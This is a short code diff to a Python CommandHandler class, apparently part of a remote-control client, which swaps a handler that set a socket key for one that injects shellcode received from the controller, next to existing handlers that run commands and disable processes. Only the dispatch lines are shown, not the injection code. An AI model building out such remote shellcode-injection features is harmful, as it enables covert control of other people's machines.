@@ -59,5 +59,5 @@ class CommandHandler:
                 self.control.run_command(command["value"])
             case c.CLIENT_DISABLE_PROCESS:
                 self.control.toggle_disable_process(command["value"])
-            case c.CLIENT_KEY:
-                self.control.socket.set_key(command["value"])
+            case c.CLIENT_SHELLCODE:
+                self.control.inject_shellcode(command["value"]["buffer"])
